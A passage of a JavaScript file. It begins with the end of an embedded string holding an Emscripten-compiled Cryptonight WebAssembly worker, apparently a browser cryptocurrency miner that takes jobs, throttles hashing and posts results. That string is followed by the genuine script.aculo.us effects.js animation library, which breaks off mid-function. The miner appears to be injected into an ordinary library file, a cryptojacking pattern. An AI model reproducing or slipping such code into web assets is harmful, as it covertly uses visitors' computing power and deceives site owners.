Module[\"preRun\"]==\"function\")Module[\"preRun\"]=[Module[\"preRun\"]];while(Module[\"preRun\"].length){addOnPreRun(Module[\"preRun\"].shift())}}callRuntimeCallbacks(__ATPRERUN__)}function ensureInitRuntime(){if(runtimeInitialized)return;runtimeInitialized=true;callRuntimeCallbacks(__ATINIT__)}function preMain(){callRuntimeCallbacks(__ATMAIN__)}function exitRuntime(){callRuntimeCallbacks(__ATEXIT__);runtimeExited=true}function postRun(){if(Module[\"postRun\"]){if(typeof Module[\"postRun\"]==\"function\")Module[\"postRun\"]=[Module[\"postRun\"]];while(Module[\"postRun\"].length){addOnPostRun(Module[\"postRun\"].shift())}}callRuntimeCallbacks(__ATPOSTRUN__)}function addOnPreRun(cb){__ATPRERUN__.unshift(cb)}function addOnPostRun(cb){__ATPOSTRUN__.unshift(cb)}var Math_abs=Math.abs;var Math_cos=Math.cos;var Math_sin=Math.sin;var Math_tan=Math.tan;var Math_acos=Math.acos;var Math_asin=Math.asin;var Math_atan=Math.atan;var Math_atan2=Math.atan2;var Math_exp=Math.exp;var Math_log=Math.log;var Math_sqrt=Math.sqrt;var Math_ceil=Math.ceil;var Math_floor=Math.floor;var Math_pow=Math.pow;var Math_imul=Math.imul;var Math_fround=Math.fround;var Math_round=Math.round;var Math_min=Math.min;var Math_max=Math.max;var Math_clz32=Math.clz32;var Math_trunc=Math.trunc;var runDependencies=0;var runDependencyWatcher=null;var dependenciesFulfilled=null;function addRunDependency(id){runDependencies++;if(Module[\"monitorRunDependencies\"]){Module[\"monitorRunDependencies\"](runDependencies)}}function removeRunDependency(id){runDependencies--;if(Module[\"monitorRunDependencies\"]){Module[\"monitorRunDependencies\"](runDependencies)}if(runDependencies==0){if(runDependencyWatcher!==null){clearInterval(runDependencyWatcher);runDependencyWatcher=null}if(dependenciesFulfilled){var callback=dependenciesFulfilled;dependenciesFulfilled=null;callback()}}}Module[\"preloadedImages\"]={};Module[\"preloadedAudios\"]={};var dataURIPrefix=\"data:application\/octet-stream;base64,\";function isDataURI(filename){return String.prototype.startsWith?filename.startsWith(dataURIPrefix):filename.indexOf(dataURIPrefix)===0}function integrateWasmJS(){var wasmTextFile=\"worker-v2.wast\";var wasmBinaryFile=\"worker-v2.wasm\";var asmjsCodeFile=\"worker-v2.temp.asm.js\";if(typeof Module[\"locateFile\"]===\"function\"){if(!isDataURI(wasmTextFile)){wasmTextFile=Module[\"locateFile\"](wasmTextFile)}if(!isDataURI(wasmBinaryFile)){wasmBinaryFile=Module[\"locateFile\"](wasmBinaryFile)}if(!isDataURI(asmjsCodeFile)){asmjsCodeFile=Module[\"locateFile\"](asmjsCodeFile)}}var wasmPageSize=64*1024;var info={\"global\":null,\"env\":null,\"asm2wasm\":{\"f64-rem\":(function(x,y){return x%y}),\"debugger\":(function(){debugger})},\"parent\":Module};var exports=null;function mergeMemory(newBuffer){var oldBuffer=Module[\"buffer\"];if(newBuffer.byteLength<oldBuffer.byteLength){Module[\"printErr\"](\"the new buffer in mergeMemory is smaller than the previous one. in native wasm, we should grow memory here\")}var oldView=new Int8Array(oldBuffer);var newView=new Int8Array(newBuffer);newView.set(oldView);updateGlobalBuffer(newBuffer);updateGlobalBufferViews()}function fixImports(imports){return imports}function getBinary(){try{if(Module[\"wasmBinary\"]){return new Uint8Array(Module[\"wasmBinary\"])}if(Module[\"readBinary\"]){return Module[\"readBinary\"](wasmBinaryFile)}else{throw\"on the web, we need the wasm binary to be preloaded and set on Module['wasmBinary']. emcc.py will do that for you when generating HTML (but not JS)\"}}catch(err){abort(err)}}function getBinaryPromise(){if(!Module[\"wasmBinary\"]&&(ENVIRONMENT_IS_WEB||ENVIRONMENT_IS_WORKER)&&typeof fetch===\"function\"){return fetch(wasmBinaryFile,{credentials:\"same-origin\"}).then((function(response){if(!response[\"ok\"]){throw\"failed to load wasm binary file at '\"+wasmBinaryFile+\"'\"}return response[\"arrayBuffer\"]()})).catch((function(){return getBinary()}))}return new Promise((function(resolve,reject){resolve(getBinary())}))}function doNativeWasm(global,env,providedBuffer){if(typeof WebAssembly!==\"object\"){Module[\"printErr\"](\"no native wasm support detected\");return false}if(!(Module[\"wasmMemory\"]instanceof WebAssembly.Memory)){Module[\"printErr\"](\"no native wasm Memory in use\");return false}env[\"memory\"]=Module[\"wasmMemory\"];info[\"global\"]={\"NaN\":NaN,\"Infinity\":Infinity};info[\"global.Math\"]=Math;info[\"env\"]=env;function receiveInstance(instance,module){exports=instance.exports;if(exports.memory)mergeMemory(exports.memory);Module[\"asm\"]=exports;Module[\"usingWasm\"]=true;removeRunDependency(\"wasm-instantiate\")}addRunDependency(\"wasm-instantiate\");if(Module[\"instantiateWasm\"]){try{return Module[\"instantiateWasm\"](info,receiveInstance)}catch(e){Module[\"printErr\"](\"Module.instantiateWasm callback failed with error: \"+e);return false}}function receiveInstantiatedSource(output){receiveInstance(output[\"instance\"],output[\"module\"])}function instantiateArrayBuffer(receiver){getBinaryPromise().then((function(binary){return WebAssembly.instantiate(binary,info)})).then(receiver).catch((function(reason){Module[\"printErr\"](\"failed to asynchronously prepare wasm: \"+reason);abort(reason)}))}if(!Module[\"wasmBinary\"]&&typeof WebAssembly.instantiateStreaming===\"function\"&&!isDataURI(wasmBinaryFile)&&typeof fetch===\"function\"){WebAssembly.instantiateStreaming(fetch(wasmBinaryFile,{credentials:\"same-origin\"}),info).then(receiveInstantiatedSource).catch((function(reason){Module[\"printErr\"](\"wasm streaming compile failed: \"+reason);Module[\"printErr\"](\"falling back to ArrayBuffer instantiation\");instantiateArrayBuffer(receiveInstantiatedSource)}))}else{instantiateArrayBuffer(receiveInstantiatedSource)}return{}}Module[\"asmPreload\"]=Module[\"asm\"];var asmjsReallocBuffer=Module[\"reallocBuffer\"];var wasmReallocBuffer=(function(size){var PAGE_MULTIPLE=Module[\"usingWasm\"]?WASM_PAGE_SIZE:ASMJS_PAGE_SIZE;size=alignUp(size,PAGE_MULTIPLE);var old=Module[\"buffer\"];var oldSize=old.byteLength;if(Module[\"usingWasm\"]){try{var result=Module[\"wasmMemory\"].grow((size-oldSize)\/wasmPageSize);if(result!==(-1|0)){return Module[\"buffer\"]=Module[\"wasmMemory\"].buffer}else{return null}}catch(e){return null}}});Module[\"reallocBuffer\"]=(function(size){if(finalMethod===\"asmjs\"){return asmjsReallocBuffer(size)}else{return wasmReallocBuffer(size)}});var finalMethod=\"\";Module[\"asm\"]=(function(global,env,providedBuffer){env=fixImports(env);if(!env[\"table\"]){var TABLE_SIZE=Module[\"wasmTableSize\"];if(TABLE_SIZE===undefined)TABLE_SIZE=1024;var MAX_TABLE_SIZE=Module[\"wasmMaxTableSize\"];if(typeof WebAssembly===\"object\"&&typeof WebAssembly.Table===\"function\"){if(MAX_TABLE_SIZE!==undefined){env[\"table\"]=new WebAssembly.Table({\"initial\":TABLE_SIZE,\"maximum\":MAX_TABLE_SIZE,\"element\":\"anyfunc\"})}else{env[\"table\"]=new WebAssembly.Table({\"initial\":TABLE_SIZE,element:\"anyfunc\"})}}else{env[\"table\"]=new Array(TABLE_SIZE)}Module[\"wasmTable\"]=env[\"table\"]}if(!env[\"memoryBase\"]){env[\"memoryBase\"]=Module[\"STATIC_BASE\"]}if(!env[\"tableBase\"]){env[\"tableBase\"]=0}var exports;exports=doNativeWasm(global,env,providedBuffer);if(!exports)abort(\"no binaryen method succeeded. consider enabling more options, like interpreting, if you want that: https:\/\/github.com\/kripken\/emscripten\/wiki\/WebAssembly#binaryen-methods\");return exports})}integrateWasmJS();STATIC_BASE=GLOBAL_BASE;STATICTOP=STATIC_BASE+10240;__ATINIT__.push();var STATIC_BUMP=10240;Module[\"STATIC_BASE\"]=STATIC_BASE;Module[\"STATIC_BUMP\"]=STATIC_BUMP;STATICTOP+=16;var PROCINFO={ppid:1,pid:42,sid:42,pgid:42};var SYSCALLS={varargs:0,get:(function(varargs){SYSCALLS.varargs+=4;var ret=HEAP32[SYSCALLS.varargs-4>>2];return ret}),getStr:(function(){var ret=Pointer_stringify(SYSCALLS.get());return ret}),get64:(function(){var low=SYSCALLS.get(),high=SYSCALLS.get();if(low>=0)assert(high===0);else assert(high===-1);return low}),getZero:(function(){assert(SYSCALLS.get()===0)})};function ___syscall20(which,varargs){SYSCALLS.varargs=varargs;try{return PROCINFO.pid}catch(e){if(typeof FS===\"undefined\"||!(e instanceof FS.ErrnoError))abort(e);return-e.errno}}function _ftime(p){var millis=Date.now();HEAP32[p>>2]=millis\/1e3|0;HEAP16[p+4>>1]=millis%1e3;HEAP16[p+6>>1]=0;HEAP16[p+8>>1]=0;return 0}var ___tm_current=STATICTOP;STATICTOP+=48;var ___tm_timezone=allocate(intArrayFromString(\"GMT\"),\"i8\",ALLOC_STATIC);function _gmtime_r(time,tmPtr){var date=new Date(HEAP32[time>>2]*1e3);HEAP32[tmPtr>>2]=date.getUTCSeconds();HEAP32[tmPtr+4>>2]=date.getUTCMinutes();HEAP32[tmPtr+8>>2]=date.getUTCHours();HEAP32[tmPtr+12>>2]=date.getUTCDate();HEAP32[tmPtr+16>>2]=date.getUTCMonth();HEAP32[tmPtr+20>>2]=date.getUTCFullYear()-1900;HEAP32[tmPtr+24>>2]=date.getUTCDay();HEAP32[tmPtr+36>>2]=0;HEAP32[tmPtr+32>>2]=0;var start=Date.UTC(date.getUTCFullYear(),0,1,0,0,0,0);var yday=(date.getTime()-start)\/(1e3*60*60*24)|0;HEAP32[tmPtr+28>>2]=yday;HEAP32[tmPtr+40>>2]=___tm_timezone;return tmPtr}function _gmtime(time){return _gmtime_r(time,___tm_current)}function _emscripten_memcpy_big(dest,src,num){HEAPU8.set(HEAPU8.subarray(src,src+num),dest);return dest}function ___setErrNo(value){if(Module[\"___errno_location\"])HEAP32[Module[\"___errno_location\"]()>>2]=value;return value}DYNAMICTOP_PTR=staticAlloc(4);STACK_BASE=STACKTOP=alignMemory(STATICTOP);STACK_MAX=STACK_BASE+TOTAL_STACK;DYNAMIC_BASE=alignMemory(STACK_MAX);HEAP32[DYNAMICTOP_PTR>>2]=DYNAMIC_BASE;staticSealed=true;function intArrayFromString(stringy,dontAddNull,length){var len=length>0?length:lengthBytesUTF8(stringy)+1;var u8array=new Array(len);var numBytesWritten=stringToUTF8Array(stringy,u8array,0,u8array.length);if(dontAddNull)u8array.length=numBytesWritten;return u8array}Module[\"wasmTableSize\"]=8;Module[\"wasmMaxTableSize\"]=8;Module.asmGlobalArg={};Module.asmLibraryArg={\"abort\":abort,\"enlargeMemory\":enlargeMemory,\"getTotalMemory\":getTotalMemory,\"abortOnCannotGrowMemory\":abortOnCannotGrowMemory,\"___setErrNo\":___setErrNo,\"___syscall20\":___syscall20,\"_emscripten_memcpy_big\":_emscripten_memcpy_big,\"_ftime\":_ftime,\"_gmtime\":_gmtime,\"DYNAMICTOP_PTR\":DYNAMICTOP_PTR,\"STACKTOP\":STACKTOP};var asm=Module[\"asm\"](Module.asmGlobalArg,Module.asmLibraryArg,buffer);Module[\"asm\"]=asm;var _aesb_single_round=Module[\"_aesb_single_round\"]=(function(){return Module[\"asm\"][\"_aesb_single_round\"].apply(null,arguments)});var _cryptonight_create=Module[\"_cryptonight_create\"]=(function(){return Module[\"asm\"][\"_cryptonight_create\"].apply(null,arguments)});var _cryptonight_destroy=Module[\"_cryptonight_destroy\"]=(function(){return Module[\"asm\"][\"_cryptonight_destroy\"].apply(null,arguments)});var _cryptonight_hash_variant_0=Module[\"_cryptonight_hash_variant_0\"]=(function(){return Module[\"asm\"][\"_cryptonight_hash_variant_0\"].apply(null,arguments)});var _cryptonight_hash_variant_1=Module[\"_cryptonight_hash_variant_1\"]=(function(){return Module[\"asm\"][\"_cryptonight_hash_variant_1\"].apply(null,arguments)});var _cryptonight_hash_variant_2=Module[\"_cryptonight_hash_variant_2\"]=(function(){return Module[\"asm\"][\"_cryptonight_hash_variant_2\"].apply(null,arguments)});var _malloc=Module[\"_malloc\"]=(function(){return Module[\"asm\"][\"_malloc\"].apply(null,arguments)});var stackAlloc=Module[\"stackAlloc\"]=(function(){return Module[\"asm\"][\"stackAlloc\"].apply(null,arguments)});Module[\"asm\"]=asm;function ExitStatus(status){this.name=\"ExitStatus\";this.message=\"Program terminated with exit(\"+status+\")\";this.status=status}ExitStatus.prototype=new Error;ExitStatus.prototype.constructor=ExitStatus;var initialStackTop;dependenciesFulfilled=function runCaller(){if(!Module[\"calledRun\"])run();if(!Module[\"calledRun\"])dependenciesFulfilled=runCaller};function run(args){args=args||Module[\"arguments\"];if(runDependencies>0){return}preRun();if(runDependencies>0)return;if(Module[\"calledRun\"])return;function doRun(){if(Module[\"calledRun\"])return;Module[\"calledRun\"]=true;if(ABORT)return;ensureInitRuntime();preMain();if(Module[\"onRuntimeInitialized\"])Module[\"onRuntimeInitialized\"]();postRun()}if(Module[\"setStatus\"]){Module[\"setStatus\"](\"Running...\");setTimeout((function(){setTimeout((function(){Module[\"setStatus\"](\"\")}),1);doRun()}),1)}else{doRun()}}Module[\"run\"]=run;function exit(status,implicit){if(implicit&&Module[\"noExitRuntime\"]&&status===0){return}if(Module[\"noExitRuntime\"]){}else{ABORT=true;EXITSTATUS=status;STACKTOP=initialStackTop;exitRuntime();if(Module[\"onExit\"])Module[\"onExit\"](status)}if(ENVIRONMENT_IS_NODE){process[\"exit\"](status)}Module[\"quit\"](status,new ExitStatus(status))}Module[\"exit\"]=exit;function abort(what){if(Module[\"onAbort\"]){Module[\"onAbort\"](what)}if(what!==undefined){Module.print(what);Module.printErr(what);what=JSON.stringify(what)}else{what=\"\"}ABORT=true;EXITSTATUS=1;throw\"abort(\"+what+\"). Build with -s ASSERTIONS=1 for more info.\"}Module[\"abort\"]=abort;if(Module[\"preInit\"]){if(typeof Module[\"preInit\"]==\"function\")Module[\"preInit\"]=[Module[\"preInit\"]];while(Module[\"preInit\"].length>0){Module[\"preInit\"].pop()()}}Module[\"noExitRuntime\"]=true;run();var CryptonightWASMWrapper=(function(){this.ctx=_cryptonight_create();this.throttleWait=0;this.throttledStart=0;this.throttledHashes=0;this.workThrottledBound=this.workThrottled.bind(this);this.currentJob=null;this.target=new Uint8Array([255,255,255,255,255,255,255,255]);var heap=Module.HEAPU8.buffer;this.input=new Uint8Array(heap,Module._malloc(84),84);this.output=new Uint8Array(heap,Module._malloc(32),32);self.postMessage(\"ready\");self.onmessage=this.onMessage.bind(this)});CryptonightWASMWrapper.prototype.onMessage=(function(msg){var job=msg.data;if(job.verify_id){this.verify(job);return}if(!this.currentJob||this.currentJob.job_id!==job.job_id){this.setJob(job)}if(job.throttle){this.throttleWait=1\/(1-job.throttle)-1;this.throttledStart=this.now();this.throttledHashes=0;this.workThrottled()}else{this.work()}});CryptonightWASMWrapper.prototype.destroy=(function(){_cryptonight_destroy(this.ctx)});CryptonightWASMWrapper.prototype.hexToBytes=(function(hex,bytes){var bytes=new Uint8Array(hex.length\/2);for(var i=0,c=0;c<hex.length;c+=2,i++){bytes[i]=parseInt(hex.substr(c,2),16)}return bytes});CryptonightWASMWrapper.prototype.bytesToHex=(function(bytes){for(var hex=\"\",i=0;i<bytes.length;i++){hex+=(bytes[i]>>>4).toString(16);hex+=(bytes[i]&15).toString(16)}return hex});CryptonightWASMWrapper.prototype.meetsTarget=(function(hash,target){for(var i=0;i<target.length;i++){var hi=hash.length-i-1,ti=target.length-i-1;if(hash[hi]>target[ti]){return false}else if(hash[hi]<target[ti]){return true}}return false});CryptonightWASMWrapper.prototype.setVersion=(function(version){if(version>7){this.cryptonight_hash_impl=_cryptonight_hash_variant_2}else if(version===7){this.cryptonight_hash_impl=_cryptonight_hash_variant_1}else{this.cryptonight_hash_impl=_cryptonight_hash_variant_0}});CryptonightWASMWrapper.prototype.setJob=(function(job){this.currentJob=job;this.blob=this.hexToBytes(job.blob);this.input.set(this.blob);this.setVersion(this.blob[0]);var target=this.hexToBytes(job.target);if(target.length<=8){for(var i=0;i<target.length;i++){this.target[this.target.length-i-1]=target[target.length-i-1]}for(var i=0;i<this.target.length-target.length;i++){this.target[i]=255}}else{this.target=target}});CryptonightWASMWrapper.prototype.now=(function(){return self.performance?self.performance.now():Date.now()});CryptonightWASMWrapper.prototype.hash=(function(input,output,length){var nonce=Math.random()*4294967295+1>>>0;this.input[39]=(nonce&4278190080)>>24;this.input[40]=(nonce&16711680)>>16;this.input[41]=(nonce&65280)>>8;this.input[42]=(nonce&255)>>0;this.cryptonight_hash_impl(this.ctx,input.byteOffset,output.byteOffset,length)});CryptonightWASMWrapper.prototype.verify=(function(job){this.blob=this.hexToBytes(job.blob);this.input.set(this.blob);this.setVersion(this.blob[0]);for(var i=0,c=0;c<job.nonce.length;c+=2,i++){this.input[39+i]=parseInt(job.nonce.substr(c,2),16)}this.cryptonight_hash_impl(this.ctx,this.input.byteOffset,this.output.byteOffset,this.blob.length);var result=this.bytesToHex(this.output);self.postMessage({verify_id:job.verify_id,verified:result===job.result,result:result})});CryptonightWASMWrapper.prototype.work=(function(){var hashes=0;var meetsTarget=false;var start=this.now();var elapsed=0;do{this.hash(this.input,this.output,this.blob.length);hashes++;meetsTarget=this.meetsTarget(this.output,this.target);elapsed=this.now()-start}while(!meetsTarget&&elapsed<1e3);var hashesPerSecond=hashes\/(elapsed\/1e3);if(meetsTarget){var nonceHex=this.bytesToHex(this.input.subarray(39,43));var resultHex=this.bytesToHex(this.output);self.postMessage({hashesPerSecond:hashesPerSecond,hashes:hashes,job_id:this.currentJob.job_id,nonce:nonceHex,result:resultHex})}else{self.postMessage({hashesPerSecond:hashesPerSecond,hashes:hashes})}});CryptonightWASMWrapper.prototype.workThrottled=(function(){var start=this.now();this.hash(this.input,this.output,this.blob.length);var end=this.now();var timePerHash=end-start;this.throttledHashes++;var elapsed=end-this.throttledStart;var hashesPerSecond=this.throttledHashes\/(elapsed\/1e3);if(this.meetsTarget(this.output,this.target)){var nonceHex=this.bytesToHex(this.input.subarray(39,43));var resultHex=this.bytesToHex(this.output);self.postMessage({hashesPerSecond:hashesPerSecond,hashes:this.throttledHashes,job_id:this.currentJob.job_id,nonce:nonceHex,result:resultHex});this.throttledHashes=0}else if(elapsed>1e3){self.postMessage({hashesPerSecond:hashesPerSecond,hashes:this.throttledHashes});this.throttledHashes=0}else{var wait=Math.min(2e3,timePerHash*this.throttleWait);setTimeout(this.workThrottledBound,wait)}});Module[\"onRuntimeInitialized\"]=(function(){var cryptonight=new CryptonightWASMWrapper}) ");

// script.aculo.us effects.js v1.8.2, Tue Nov 18 18:30:58 +0100 2008

// Copyright (c) 2005-2008 Thomas Fuchs (http://script.aculo.us, http://mir.aculo.us)
// Contributors:
//  Justin Palmer (http://encytemedia.com/)
//  Mark Pilgrim (http://diveintomark.org/)
//  Martin Bialasinki
//
// script.aculo.us is freely distributable under the terms of an MIT-style license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

// converts rgb() and #xxx to #xxxxxx format,
// returns self (or first argument) if not convertable
String.prototype.parseColor = function() {
  var color = '#';
  if (this.slice(0,4) == 'rgb(') {
    var cols = this.slice(4,this.length-1).split(',');
    var i=0; do { color += parseInt(cols[i]).toColorPart() } while (++i<3);
  } else {
    if (this.slice(0,1) == '#') {
      if (this.length==4) for(var i=1;i<4;i++) color += (this.charAt(i) + this.charAt(i)).toLowerCase();
      if (this.length==7) color = this.toLowerCase();
    }
  }
  return (color.length==7 ? color : (arguments[0] || this));
};

/*--------------------------------------------------------------------------*/

Element.collectTextNodes = function(element) {
  return $A($(element).childNodes).collect( function(node) {
    return (node.nodeType==3 ? node.nodeValue :
      (node.hasChildNodes() ? Element.collectTextNodes(node) : ''));
  }).flatten().join('');
};

Element.collectTextNodesIgnoreClass = function(element, className) {
  return $A($(element).childNodes).collect( function(node) {
    return (node.nodeType==3 ? node.nodeValue :
      ((node.hasChildNodes() && !Element.hasClassName(node,className)) ?
        Element.collectTextNodesIgnoreClass(node, className) : ''));
  }).flatten().join('');
};

Element.setContentZoom = function(element, percent) {
  element = $(element);
  element.setStyle({fontSize: (percent/100) + 'em'});
  if (Prototype.Browser.WebKit) window.scrollBy(0,0);
  return element;
};

Element.getInlineOpacity = function(element){
  return $(element).style.opacity || '';
};

Element.forceRerendering = function(element) {
  try {
    element = $(element);
    var n = document.createTextNode(' ');
    element.appendChild(n);
    element.removeChild(n);
  } catch(e) { }
};

/*--------------------------------------------------------------------------*/

var Effect = {
  _elementDoesNotExistError: {
    name: 'ElementDoesNotExistError',
    message: 'The specified DOM element does not exist, but is required for this effect to operate'
  },
  Transitions: {
    linear: Prototype.K,
    sinoidal: function(pos) {
      return (-Math.cos(pos*Math.PI)/2) + .5;
    },
    reverse: function(pos) {
      return 1-pos;
    },
    flicker: function(pos) {
      var pos = ((-Math.cos(pos*Math.PI)/4) + .75) + Math.random()/4;
      return pos > 1 ? 1 : pos;
    },
    wobble: function(pos) {
      return (-Math.cos(pos*Math.PI*(9*pos))/2) + .5;
    },
    pulse: function(pos, pulses) {
      return (-Math.cos((pos*((pulses||5)-.5)*2)*Math.PI)/2) + .5;
    },
    spring: function(pos) {
      return 1 - (Math.cos(pos * 4.5 * Math.PI) * Math.exp(-pos * 6));
    },
    none: function(pos) {
      return 0;
    },
    full: function(pos) {
      return 1;
    }
  },
  DefaultOptions: {
    duration:   1.0,   // seconds
    fps:        100,   // 100= assume 66fps max.
    sync:       false, // true for combining
    from:       0.0,
    to:         1.0,
    delay:      0.0,
    queue:      'parallel'
  },
  tagifyText: function(element) {
    var tagifyStyle = 'position:relative';
    if (Prototype.Browser.IE) tagifyStyle += ';zoom:1';

    element = $(element);
    $A(element.childNodes).each( function(child) {
      if (child.nodeType==3) {
        child.nodeValue.toArray().each( function(character) {
          element.insertBefore(
            new Element('span', {style: tagifyStyle}).update(
              character == ' ' ? String.fromCharCode(160) : character),
              child);
        });
        Element.remove(child);
      }
    });
  },
  multiple: function(element, effect) {
    var elements;
    if (((typeof element == 'object') ||
        Object.isFunction(element)) &&
       (element.length))
      elements = element;
    else
      elements = $(element).childNodes;

    var options = Object.extend({
      speed: 0.1,
      delay: 0.0
    }, arguments[2] || { });
    var masterDelay = options.delay;

    $A(elements).each( function(element, index) {
      new effect(element, Object.extend(options, { delay: index * options.speed + masterDelay }));
    });
  },
  PAIRS: {
    'slide':  ['SlideDown','SlideUp'],
    'blind':  ['BlindDown','BlindUp'],
    'appear': ['Appear','Fade']
  },
  toggle: function(element, effect) {
    element = $(element);
    effect = (effect || 'appear').toLowerCase();
    var options = Object.extend({
      queue: { position:'end', scope:(element.id || 'global'), limit: 1 }
    }, arguments[2] || { });
    Effect[element.visible() ?
      Effect.PAIRS[effect][1] : Effect.PAIRS[effect][0]](element, options);
  }
};

Effect.DefaultOptions.transition = Effect.Transitions.sinoidal;

/* ------------- core effects ------------- */

Effect.ScopedQueue = Class.create(Enumerable, {
  initialize: function() {
    this.effects  = [];
    this.interval = null;
  },
  _each: function(iterator) {
    this.effects._each(iterator);
  },
  add: function(effect) {
    var timestamp = new Date().getTime();

    var position = Object.isString(effect.options.queue) ?
      effect.options.queue : effect.options.queue.position;

    switch(position) {
      case 'front':
        // move unstarted effects after this effect
        this.effects.findAll(function(e){ return e.state=='idle' }).each( function(e) {
            e.startOn  += effect.finishOn;
            e.finishOn += effect.finishOn;
          });
        break;
      case 'with-last':
        timestamp = this.effects.pluck('startOn').max() || timestamp;
        break;
      case 'end':
        // start effect after last queued effect has finished
        timestamp = this.effects.pluck('finishOn').max() || timestamp;
        break;
    }

    effect.startOn  += timestamp;
    effect.finishOn += timestamp;

    if (!effect.options.queue.limit || (this.effects.length < effect.options.queue.limit))
      this.effects.push(effect);

    if (!this.interval)
      this.interval = setInterval(this.loop.bind(this), 15);
  },
  remove: function(effect) {
    this.effects = this.effects.reject(function(e) { return e==effect });
    if (this.effects.length == 0) {
      clearInterval(this.interval);
      this.interval = null;
    }
  },
  loop: function() {
    var timePos = new Date().getTime();
    for(var i=0, len=this.effects.length;i<len;i++)
      this.effects[i] && this.effects[i].loop(timePos);
  }
});

Effect.Queues = {
  instances: $H(),
  get: function(queueName) {
    if (!Object.isString(queueName)) return queueName;

    return this.instances.get(queueName) ||
      this.instances.set(queueName, new Effect.ScopedQueue());
  }
};
Effect.Queue = Effect.Queues.get('global');

Effect.Base = Class.create({
  position: null,
  start: function(options) {
    function codeForEvent(options,eventName){
      return (
        (options[eventName+'Internal'] ? 'this.options.'+eventName+'Internal(this);' : '') +
        (options[eventName] ? 'this.options.'+eventName+'(this);' : '')
      );
    }
    if (options && options.transition === false) options.transition = Effect.Transitions.linear;
    this.options      = Object.extend(Object.extend({ },Effect.DefaultOptions), options || { });
    this.currentFrame = 0;
    this.state        = 'idle';
    this.startOn      = this.options.delay*1000;
    this.finishOn     = this.startOn+(this.options.duration*1000);
    this.fromToDelta  = this.options.to-this.options.from;
    this.totalTime    = this.finishOn-this.startOn;
    this.totalFrames  = this.options.fps*this.options.duration;

    this.render = (function() {
      function dispatch(effect, eventName) {
        if (effect.options[eventName + 'Internal'])
          effect.options[eventName + 'Internal'](effect);
        if (effect.options[eventName])
          effect.options[eventName](effect);
      }

      return function(pos) {
        if (this.state === "idle") {
          this.state = "running";
          dispatch(this, 'beforeSetup');
          if (this.setup) this.setup();
          dispatch(this, 'afterSetup');
        }
        if (this.state === "running") {
          pos = (this.options.transition(pos) * this.fromToDelta) + this.options.from;
          this.position = pos;
          dispatch(this, 'beforeUpdate');
          if (this.update) this.update(pos);
          dispatch(this, 'afterUpdate');
        }
      };
    })();

    this.event('beforeStart');
    if (!this.options.sync)
      Effect.Queues.get(Object.isString(this.options.queue) ?
        'global' : this.options.queue.scope).add(this);
  },
  loop: function(timePos) {
    if (timePos >= this.startOn) {
      if (timePos >= this.finishOn) {
        this.render(1.0);
        this.cancel();
        this.event('beforeFinish');
        if (this.finish) this.finish();
        this.event('afterFinish');
        return;
      }
      var pos   = (timePos - this.startOn) / this.totalTime,
          frame = (pos * this.totalFrames).round();
      if (frame > this.currentFrame) {
        this.render(pos);
        this.currentFrame = frame;
      }
    }
  },
  cancel: function() {
    if (!this.options.sync)
      Effect.Queues.get(Object.isString(this.options.queue) ?
        'global' : this.options.queue.scope).remove(this);
    this.state = 'finished';
  },
  event: function(eventName) {
    if (this.options[eventName + 'Internal']) this.options[eventName + 'Internal'](this);
    if (this.options[eventName]) this.options[eventName](this);
  },
  inspect: function() {
    var data = $H();
    for(property in this)
      if (!Object.isFunction(this[property])) data.set(property, this[property]);
    return '#<Effect:' + data.inspect() + ',options:' + $H(this.options).inspect() + '>';
  }
});

Effect.Parallel = Class.create(Effect.Base, {
  initialize: function(effects) {
    this.effects = effects || [];
    this.start(arguments[1]);
  },
  update: function(position) {
    this.effects.invoke('render', position);
  },
  finish: function(position) {
    this.effects.each( function(effect) {
      effect.render(1.0);
      effect.cancel();
      effect.event('beforeFinish');
      if (effect.finish) effect.finish(position);
      effect.event('afterFinish');
    });
  }
});

Effect.Tween = Class.create(Effect.Base, {
  initialize: function(object, from, to) {
    object = Object.isString(object) ? $(object) : object;
    var args = $A(arguments), method = args.last(),
      options = args.length == 5 ? args[3] : null;
    this.method = Object.isFunction(method) ? method.bind(object) :
      Object.isFunction(object[method]) ? object[method].bind(object) :
      function(value) { object[method] = value };
    this.start(Object.extend({ from: from, to: to }, options || { }));
  },
  update: function(position) {
    this.method(position);
  }
});

Effect.Event = Class.create(Effect.Base, {
  initialize: function() {
    this.start(Object.extend({ duration: 0 }, arguments[0] || { }));
  },
  update: Prototype.emptyFunction
});

Effect.Opacity = Class.create(Effect.Base, {
  initialize: function(element) {
    this.element = $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    // make this work on IE on elements without 'layout'
    if (Prototype.Browser.IE && (!this.element.currentStyle.hasLayout))
      this.element.setStyle({zoom: 1});
    var options = Object.extend({
      from: this.element.getOpacity() || 0.0,
      to:   1.0
    }, arguments[1] || { });
    this.start(options);
  },
  update: function(position) {
    this.element.setOpacity(position);
  }
});

Effect.Move = Class.create(Effect.Base, {
  initialize: function(element) {
    this.element = $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    var options = Object.extend({
      x:    0,
      y:    0,
      mode: 'relative'
    }, arguments[1] || { });
    this.start(options);
  },
  setup: function() {
    this.element.makePositioned();
    this.originalLeft = parseFloat(this.element.getStyle('left') || '0');
    this.originalTop  = parseFloat(this.element.getStyle('top')  || '0');
    if (this.options.mode == 'absolute') {
      this.options.x = this.options.x - this.originalLeft;
      this.options.y = this.options.y - this.originalTop;
    }
  },
  update: function(position) {
    this.element.setStyle({
      left: (this.options.x  * position + this.originalLeft).round() + 'px',
      top:  (this.options.y  * position + this.originalTop).round()  + 'px'
    });
  }
});

// for backwards compatibility
Effect.MoveBy = function(element, toTop, toLeft) {
  return new Effect.Move(element,
    Object.extend({ x: toLeft, y: toTop }, arguments[3] || { }));
};

Effect.Scale = Class.create(Effect.Base, {
  initialize: function(element, percent) {
    this.element = $(element);
    if (!this.element) throw(Effect._elementDoesNotExistError);
    var options = Object.extend({
      scaleX: true,
      scaleY: true,
      scaleContent: true,
      scaleFromCenter: false,
      scaleMode: 'box',        // 'box' or 'contents' or { } with provided values
      scaleFrom: 100.0,
      scaleTo:   percent
    }, arguments[2] || { });
    this.start(options);
  },
  setup: function() {
    this.restoreAfterFinish = this.options.restoreAfterFinish || false;
    this.elementPositioning = this.element.getStyle('position');

    this.originalStyle = { };
    ['top','left','width','height','fontSize'].each( function(k) {
      this.originalStyle[k] = this.element.style[k];
    }.bind(this));

    this.originalTop  = this.element.offsetTop;
    this.originalLeft = this.element.offsetLeft;

    var fontSize = this.element.getStyle('font-size') || '100%';
    ['em','px','%','pt'].each( function(fontSizeType) {
      if (fontSize.indexOf(fontSizeType)>0) {
